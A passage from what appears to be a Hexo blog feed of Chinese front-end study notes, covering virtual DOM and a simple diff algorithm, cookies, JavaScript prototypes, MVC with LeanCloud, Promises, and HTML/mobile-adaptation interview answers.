title="那什么是虚拟DOM"></a>那什么是虚拟DOM</h2><blockquote><p>假设我们要操作一个数据的报表，这个报表大概有几百条数据，我们要对这个报表进行一个排序的操作</p></blockquote><p>我们有这样一个表格，这里面大概有100多项</p><table><thead><tr><th>姓名</th><th>年纪</th><th>分数</th><th>等等</th></tr></thead><tbody><tr><td>小红</td><td>12</td><td>44</td><td></td></tr><tr><td>小花</td><td>13</td><td>78</td><td></td></tr></tbody></table><ol><li><p>当我去点年纪的时候，希望年纪里的所有DOM元素可以按照年纪去排序，当我点新增的时候会在表格下面再新增一行数据，当我点击姓名的时候所有DOM按照姓名去做一个排序，我们可以想下用原生JS怎么去做排序，用JS去对DOM结构去排序，操作起来很难实现，也很麻烦。</p></li><li><p>后来我们有了MVVM框架可以对数据排序，数据对应到页面上的DOM结构，我们只需要对数据排序，那里面的DOM结构自然就排序了。</p></li><li><p>我们自己实现一个框架，假设数据变了，那我们的DOM结构也就变了，难道我们需要把数据重新渲染一次，如果用户频繁大量改动数据，DOM也会频繁改动，就会造成卡顿，那我们可以去做一些优化，怎么去做优化呢？</p></li><li><p>那我们可以像计算机内存那样，我们可以自己设定一个虚拟的数据结构，它是对真实的DOM结构是一一对应的，我们可以先对虚拟的数据结构进行操作，等全部操作完成了，再把它渲染成真实的DOM，那就变成了真实的数据。</p></li></ol><ul><li><strong>那这样做有什么好处呢？</strong></li></ul><blockquote><p>假设用户只做了微小的改动，比如增加了2条数据，那我们可以想打补丁一样，只把这两条加到真实的DOM里，而不用把整个DOM重新渲染。</p></blockquote><p>那这是虚拟DOM以及他的作用</p><p><strong>那虚拟DOM就是针对真实DOM做的一个一一映射的类似虚拟的数据结构，有了变化再把数据结构渲染到DOM里，做到局部的变化，实现行能优化。</strong></p><h2 id="那我们怎么实现它呢"><a href="#那我们怎么实现它呢" class="headerlink" title="那我们怎么实现它呢"></a>那我们怎么实现它呢</h2><ul><li>以下代码为将数据结构如何转化为虚拟DOM，然后将虚拟DOM渲染到页面中变成真正的DOM。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">class VNode &#123;</span><br><span class="line">  constructor(tag, children, text) &#123;</span><br><span class="line">    this.tag = tag</span><br><span class="line">    this.text = text</span><br><span class="line">    this.children = children</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    if(this.tag === &#x27;#text&#x27;) &#123;</span><br><span class="line">      return document.createTextNode(this.text)</span><br><span class="line">    &#125;</span><br><span class="line">    let el = document.createElement(this.tag)</span><br><span class="line">    this.children.forEach(vChild =&gt; &#123;</span><br><span class="line">      el.appendChild(vChild.render())</span><br><span class="line">    &#125;)</span><br><span class="line">    return el</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function v(tag, children, text) &#123;</span><br><span class="line">  if(typeof children === &#x27;string&#x27;) &#123;</span><br><span class="line">    text = children</span><br><span class="line">    children = []</span><br><span class="line">  &#125;</span><br><span class="line">  return new VNode(tag, children, text)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">//虚拟的JSON格式的数据结构</span><br><span class="line">let nodesData = &#123;</span><br><span class="line">  tag: &#x27;div&#x27;,</span><br><span class="line">  children: [</span><br><span class="line">    &#123;</span><br><span class="line">      tag: &#x27;p&#x27;,</span><br><span class="line">      children: [</span><br><span class="line">        &#123;</span><br><span class="line">          tag: &#x27;span&#x27;,</span><br><span class="line">          children: [</span><br><span class="line">            &#123;</span><br><span class="line">              tag: &#x27;#text&#x27;,</span><br><span class="line">              text: &#x27;hi&#x27;</span><br><span class="line">            &#125;</span><br><span class="line">          ]</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      tag: &#x27;span&#x27;,</span><br><span class="line">        children: [</span><br><span class="line">          &#123;</span><br><span class="line">            tag: &#x27;#text&#x27;,</span><br><span class="line">            text: &#x27;oo&#x27;</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">let vNodes = v(&#x27;div&#x27;, [</span><br><span class="line">      v(&#x27;p&#x27;, [</span><br><span class="line">        v(&#x27;span&#x27;, [ v(&#x27;#text&#x27;, &#x27;hi&#x27;) ] )</span><br><span class="line">        ]</span><br><span class="line">      ),</span><br><span class="line">      v(&#x27;span&#x27;, [</span><br><span class="line">        v(&#x27;#text&#x27;,  &#x27;oo&#x27;)</span><br><span class="line">        ])</span><br><span class="line">    ]</span><br><span class="line">  )</span><br><span class="line">console.log(vNodes.render())</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h2 id="什么是diff"><a href="#什么是diff" class="headerlink" title="什么是diff"></a>什么是diff</h2><p>我们需要做一些改变的时候，比如增删改查，那么我们需要将改变后的虚拟DOM树与真实的DOM树做对比，找出差异，然后做到局部更新改变的地方，那么找出差异就是diff（算法找两棵DOM树的差异）。</p><hr><p>以下代码为简单的实现 DOM diff </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">function patchElement(parent, newVNode, oldVNode, index = 0) &#123;</span><br><span class="line">  if(!oldVNode) &#123;</span><br><span class="line">    parent.appendChild(newVNode.render())</span><br><span class="line">  &#125; else if(!newVNode) &#123;</span><br><span class="line">    parent.removeChild(parent.childNodes[index])</span><br><span class="line">  &#125; else if(newVNode.tag !== oldVNode.tag || newVNode.text !== oldVNode.text) &#123;</span><br><span class="line">    parent.replaceChild(newVNode.render(), parent.childNodes[index])</span><br><span class="line">  &#125;  else &#123;</span><br><span class="line">    for(let i = 0; i &lt; newVNode.children.length || i &lt; oldVNode.children.length; i++) &#123;</span><br><span class="line">      patchElement(parent.childNodes[index], newVNode.children[i], oldVNode.children[i], i)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">let vNode1 = v(&#x27;div&#x27;, [</span><br><span class="line">      v(&#x27;p&#x27;, [</span><br><span class="line">        v(&#x27;span&#x27;, [ v(&#x27;#text&#x27;, &#x27;hi&#x27;) ] )</span><br><span class="line">        ]</span><br><span class="line">      ),</span><br><span class="line">      v(&#x27;span&#x27;, [</span><br><span class="line">        v(&#x27;#text&#x27;,  &#x27;oo&#x27;)</span><br><span class="line">        ])</span><br><span class="line">    ]</span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">let vNode2 = v(&#x27;div&#x27;, [</span><br><span class="line">      v(&#x27;p&#x27;, [</span><br><span class="line">        v(&#x27;span&#x27;, [ </span><br><span class="line">          v(&#x27;#text&#x27;, &#x27;hi&#x27;) </span><br><span class="line">          ] )</span><br><span class="line">        ]</span><br><span class="line">      ),</span><br><span class="line">      v(&#x27;span&#x27;, [</span><br><span class="line">        v(&#x27;#text&#x27;,  &#x27;oo&#x27;),</span><br><span class="line">        v(&#x27;#text&#x27;,  &#x27;xx&#x27;)</span><br><span class="line">        ])</span><br><span class="line">    ]</span><br><span class="line">  )</span><br><span class="line">const root = document.querySelector(&#x27;#root&#x27;)</span><br><span class="line">patchElement(root, vNode1)</span><br><span class="line">patchElement(root, vNode1，vNode2)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cookie是什么</title>
      <link href="/posts/c1b6cd4f/"/>
      <url>/posts/c1b6cd4f/</url>
      
        <content type="html"><![CDATA[<h1 id="维基百科定义"><a href="#维基百科定义" class="headerlink" title="维基百科定义"></a>维基百科定义</h1><p>Cookie（复数形态Cookies），又称为“小甜饼”。类型为“小型文本文件”[1]，指某些网站为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）。由网景公司的前雇员卢·蒙特利在1993年3月发明[2]。最初定义于RFC 2109。当前使用最广泛的 Cookie标准却不是RFC中定义的任何一个，而是在网景公司制定的标准上进行扩展后的产物。</p><h1 id="我的理解"><a href="#我的理解" class="headerlink" title="我的理解"></a>我的理解</h1><ol><li>Cookie就是用户登录网站，浏览器去访问服务器问这个人能不能登录，然后服务器传送给浏览器的一段数据。</li><li>浏览器会保留这段数据，不能随便删除（一般默认20分钟左右，浏览器不同具体时间不同）</li><li>然后这段时间内用户通过浏览器继续访问服务器，都必须带一个Cookie</li><li>Cookie 默认在用户关闭页面后就失效，后台代码可以任意设置 Cookie 的过期时间</li><li>大小大概在 4kb 以内</li></ol><h1 id="Cookie的特点"><a href="#Cookie的特点" class="headerlink" title="Cookie的特点"></a>Cookie的特点</h1><ol><li>服务器通过 Set-Cookie 响应头设置Cookie</li><li>浏览器得到Cookie之后，每次请求都要带上Cookie</li><li>服务器读取Cookie就知道登录用户的信息（用户名啥的）</li></ol><h1 id="如何使用-Cookie"><a href="#如何使用-Cookie" class="headerlink" title="如何使用 Cookie"></a>如何使用 Cookie</h1><p>Cookie 一般有两个作用。</p><h2 id="第一个作用是识别用户身份"><a href="#第一个作用是识别用户身份" class="headerlink" title="第一个作用是识别用户身份"></a>第一个作用是识别用户身份</h2><p>比如用户小红用浏览器访问了 <a href="http://qq.com,那么qq/">http://qq.com，那么qq</a> 的服务器就会立刻给小红返回一段数据就是Cookie。当 小红 再次访问qq的其他页面时，就会附带上这段数据。</p><p>同理有个小白用浏览器访问了 <a href="http://qq.com,那么qq/">http://qq.com，那么qq</a> 的服务器就会立刻给小白返回一段数据就是Cookie。当 小白 再次访问qq的其他页面时，就会附带上这段数据。</p><p>借此，<a href="http://qq.com/">http://qq.com</a> 的服务器就能区分 小白和 小红 两个用户了。</p><h2 id="第二个作用是记录历史"><a href="#第二个作用是记录历史" class="headerlink" title="第二个作用是记录历史"></a>第二个作用是记录历史</h2><p><a href="http://taobao.com/">http://taobao.com</a> 是一个购物网站，当 小红 在上面将商品 白鞋 、酱油 加入购物车时，JS 可以改写 Cookie，在Cookie中添加两个商品的信息，表示购物车里有 白鞋 和 酱油 两样商品了。</p><p>这样一来，当用户关闭网页，过三天再打开网页的时候，依然可以看到 白鞋、酱油 躺在购物车里，因为浏览器并不会无缘无故地删除这个 Cookie。</p><p>借此，就达到里记录用户操作历史的目的了。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS高级基础知识小结</title>
      <link href="/posts/69c49c79/"/>
      <url>/posts/69c49c79/</url>
      
        <content type="html"><![CDATA[<h1 id="原型与原型链"><a href="#原型与原型链" class="headerlink" title="原型与原型链"></a>原型与原型链</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">var object = &#123;&#125;</span><br><span class="line">object.__proto__ ===  Object.prototype  // 为 true</span><br><span class="line"></span><br><span class="line">var fn = function()&#123;&#125;</span><br><span class="line">fn.__proto__ === Function.prototype  // 为 true</span><br><span class="line">fn.__proto__.__proto__ === Object.prototype // 为 true</span><br><span class="line"></span><br><span class="line">var array = []</span><br><span class="line">array.__proto__ === Array.prototype // 为 true</span><br><span class="line">array.__proto__.__proto__ === Object.prototype // 为 true</span><br><span class="line"></span><br><span class="line">Function.__proto__ === Function.prototype // 为 true</span><br><span class="line">Array.__proto__ === Function.prototype // 为 true</span><br><span class="line">Object.__proto__ === Function.prototype // 为 true</span><br><span class="line"></span><br><span class="line">true.__proto__ === Boolean.prototype // 为 true</span><br><span class="line"></span><br><span class="line">Function.prototype.__proto__ === Object.prototype // 为 true</span><br></pre></td></tr></table></figure><h1 id="面向对象new与this"><a href="#面向对象new与this" class="headerlink" title="面向对象new与this"></a>面向对象new与this</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function fn()&#123;</span><br><span class="line">    console.log(this)</span><br><span class="line">&#125;</span><br><span class="line">new fn()</span><br></pre></td></tr></table></figure><p>new fn() 会执行 fn，并打印出 this，请问这个 this 有哪些属性？这个 this 的原型有哪些属性？</p><ul><li>this 自身没有属性（只有一个隐藏的 <strong>proto</strong> 属性）</li><li>this 的原型是 fn.prototype，只有一个属性 constructor，且 constructor &#x3D;&#x3D;&#x3D; fn（另外还有一个隐藏属性 __proto__，指向 Object.prototype</li></ul><h1 id="JSON与JavaScript"><a href="#JSON与JavaScript" class="headerlink" title="JSON与JavaScript"></a>JSON与JavaScript</h1><h2 id="JSON-和-JavaScript-是什么关系"><a href="#JSON-和-JavaScript-是什么关系" class="headerlink" title="JSON 和 JavaScript 是什么关系?"></a>JSON 和 JavaScript 是什么关系?</h2><p>关系：JSON 是一门抄袭&#x2F;借鉴 JavaScript 的语言，同时也是一种数据交互格式，JSON 是 JavaScript 的子集（或者说 JSON 只抄袭了一部分 JavaScript 语法，而且没有新增任何原创的语法）</p><h2 id="JSON-和-JavaScript-的区别有哪些？"><a href="#JSON-和-JavaScript-的区别有哪些？" class="headerlink" title="JSON 和 JavaScript 的区别有哪些？"></a>JSON 和 JavaScript 的区别有哪些？</h2><p>区别：JSON 不支持函数、undefined、变量、引用、单引号字符串、对象的key不支持单引号也不支持不加引号、没有内置的 Date、Math、RegExp 等。<br>而 JavaScript 全都支持。</p><h1 id="前端MVC"><a href="#前端MVC" class="headerlink" title="前端MVC"></a>前端MVC</h1><h2 id="前端-MVC-是什么？"><a href="#前端-MVC-是什么？" class="headerlink" title="前端 MVC 是什么？"></a>前端 MVC 是什么？</h2><ul><li>MVC 是一种设计模式（或者软件架构），把系统分为三层：Model数据、View视图和Controller控制器。</li><li>Model 数据管理，包括数据逻辑、数据请求、数据存储等功能。前端 Model 主要负责 AJAX 请求或者 LocalStorage 存储</li><li>View 负责用户界面，前端 View 主要负责 HTML 渲染。</li><li>Controller 负责处理 View 的事件，并更新 Model；也负责监听 Model 的变化，并更新 View，Controller 控制其他的所有流程。</li></ul><h2 id="MVC-三个对象分别有哪些重要属性和方法"><a href="#MVC-三个对象分别有哪些重要属性和方法" class="headerlink" title="MVC 三个对象分别有哪些重要属性和方法"></a>MVC 三个对象分别有哪些重要属性和方法</h2><ul><li>代码1-将MVC分别存为3个基础文件将共有的属性放进去Model.js,View.js,Controller.js<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">window.Controller = function(options)&#123;</span><br><span class="line">  var init = options.init</span><br><span class="line">  let object = &#123;</span><br><span class="line">    view: null,</span><br><span class="line">    model: null,</span><br><span class="line">    init: function (view, model) &#123;</span><br><span class="line">      this.view = view</span><br><span class="line">      this.model = model</span><br><span class="line">      this.model.init()</span><br><span class="line">      init.call(this, view, model)</span><br><span class="line">      options.bindEvents.call(this)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  for(let key in options)&#123;</span><br><span class="line">    if(key !== &#x27;init&#x27;)&#123;</span><br><span class="line">      object[key] = options[key]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return object</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">window.Model = function(options) &#123;</span><br><span class="line">  let resourceName = options.resourceName</span><br><span class="line">  return&#123;</span><br><span class="line">    init: function () &#123;</span><br><span class="line">      var APP_ID = &#x27;&#x27;;</span><br><span class="line">      var APP_KEY = &#x27;&#x27;;</span><br><span class="line">      AV.init(&#123;</span><br><span class="line">        appId: APP_ID,</span><br><span class="line">        appKey: APP_KEY</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    //获取数据</span><br><span class="line">    fetch: function () &#123;</span><br><span class="line">      var query = new AV.Query(resourceName);</span><br><span class="line">      return query.find() //Promise对象</span><br><span class="line">    &#125;,</span><br><span class="line">    //创建数据</span><br><span class="line">    save: function (object) &#123;</span><br><span class="line">      var X = AV.Object.extend(resourceName);</span><br><span class="line">      var x = new X();</span><br><span class="line">      return x.save(object)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">window.View = function(selector)&#123;</span><br><span class="line">  return document.querySelector(selector)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>代码2-每个模块自己独有的MVC<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">var model = &#123;</span><br><span class="line">    data: null,</span><br><span class="line">    init()&#123;&#125;</span><br><span class="line">    fetch()&#123;&#125;</span><br><span class="line">    save()&#123;&#125;</span><br><span class="line">    update()&#123;&#125;</span><br><span class="line">    delete()&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">view = &#123;</span><br><span class="line">    init() &#123;&#125;</span><br><span class="line">    template: &#x27;&lt;h1&gt;hi&lt;/h1&#x27;&gt;</span><br><span class="line">&#125;</span><br><span class="line">controller = &#123;</span><br><span class="line">    view: null,</span><br><span class="line">    model: null,</span><br><span class="line">    init(view, model)&#123;</span><br><span class="line">        this.view = view</span><br><span class="line">        this.model = model</span><br><span class="line">        this.bindEvents()</span><br><span class="line">    &#125;</span><br><span class="line">    render()&#123;</span><br><span class="line">        this.view.querySelector(&#x27;name&#x27;).innerText = this.model.data.name</span><br><span class="line">    &#125;,</span><br><span class="line">    bindEvents()&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h1 id="在-ES5-中如何用函数模拟一个类"><a href="#在-ES5-中如何用函数模拟一个类" class="headerlink" title="在 ES5 中如何用函数模拟一个类"></a>在 ES5 中如何用函数模拟一个类</h1><p>ES 5 没有 class 关键字，所以只能使用函数来模拟类。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function Human(name)&#123;</span><br><span class="line">    this.name = name</span><br><span class="line">&#125;</span><br><span class="line">Human.prototype.run = function()&#123;&#125;</span><br><span class="line"></span><br><span class="line">var person = new Human(&#x27;qq&#x27;)</span><br></pre></td></tr></table></figure><h1 id="Promise相关"><a href="#Promise相关" class="headerlink" title="Promise相关"></a>Promise相关</h1><p>jQuery 或者 axios 的 AJAX 功能，都返回的是 Promise 对象。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;url:&#x27;/xxx&#x27;, method:&#x27;get&#x27;&#125;).then(success1, error1).then(success2, error2)</span><br></pre></td></tr></table></figure><p>如果我自己创建 Promise 对象，我会这么写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function asyncMethod()&#123;</span><br><span class="line">    return new Promise(function (resolve, reject)&#123;</span><br><span class="line">        setTimeout(function()&#123;</span><br><span class="line">            成功则调用 resolve</span><br><span class="line">            失败则调用 reject</span><br><span class="line">        &#125;,3000)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端知识小结</title>
      <link href="/posts/e707bd3a/"/>
      <url>/posts/e707bd3a/</url>
      
        <content type="html"><![CDATA[<h1 id="请写出一个符合-W3C-规范的-HTML-文件"><a href="#请写出一个符合-W3C-规范的-HTML-文件" class="headerlink" title="请写出一个符合 W3C 规范的 HTML 文件"></a>请写出一个符合 W3C 规范的 HTML 文件</h1><p>要求</p><p>页面标题为「我的页面」</p><p>页面中引入了一个外部 CSS 文件，文件路径为 &#x2F;style.css</p><p>页面中引入了另一个外部 CSS 文件，路径为</p><p>&#x2F;print.css，该文件仅在打印时生效</p><p>页面中引入了另一个外部 CSS 文件，路径为</p><p>&#x2F;mobile.css，该文件仅在设备宽度小于 500 像素时生效</p><p>页面中引入了一个外部 JS 文件，路径为 &#x2F;main.js</p><p>页面中引入了一个外部 JS 文件，路径为 &#x2F;gbk.js，文件编码为 GBK</p><p>页面中有一个 SVG 标签，SVG 里面有一个直径为 100 像素的圆圈，颜色随意<br>注意题目中的路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">  &lt;title&gt;我的页面&lt;/title&gt;</span><br><span class="line">  &lt;link rel=&quot;stylesheet&quot; href=&quot;/style.css&quot;&gt;</span><br><span class="line">  &lt;link rel=&quot;stylesheet&quot; href=&quot;/print.css&quot; media=&quot;print&quot;&gt;</span><br><span class="line">  &lt;link rel=&quot;stylesheet&quot; href=&quot;/mobile.css&quot; media=&quot;(max-width: 500px)&quot;&gt;</span><br><span class="line">  &lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">    *&#123;</span><br><span class="line">        padding: 0;</span><br><span class="line">        margin: 0;</span><br><span class="line">     &#125;</span><br><span class="line">  &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;svg&gt;</span><br><span class="line">    &lt;circle cx=&quot;100&quot; cy=&quot;100&quot; r=&quot;50&quot; fill=&quot;black&quot;&gt;</span><br><span class="line">  &lt;/svg&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">  &lt;script type=&quot;text/javascript&quot; src=&quot;./main.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &lt;script type=&quot;text/javascript&quot; src=&quot;./gbk.js&quot; charset=&quot;GBK&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="移动端是怎么做适配的？"><a href="#移动端是怎么做适配的？" class="headerlink" title="移动端是怎么做适配的？"></a>移动端是怎么做适配的？</h1><p>回答要点：</p><p>meta viewport</p><p>媒体查询</p><p>动态 rem 方案</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">1.meta viewport</span><br><span class="line">在head标签内部加上这段代码</span><br><span class="line"></span><br><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;&gt;</span><br><span class="line">该meta标签的作用是让当前viewport的宽度等于设备的宽度，同时不允许用户手动缩放。也许允不允许用户缩放不同的网站有不同的要求，但让viewport的宽度等于设备的宽度。</span><br><span class="line">width=device-width: 让当前viewport宽度等于设备的宽度</span><br><span class="line">user-scalable=no: 禁止用户缩放</span><br><span class="line">initial-scale=1.0: 设置页面的初始缩放值为不缩放</span><br><span class="line">maximum-scale=1.0: 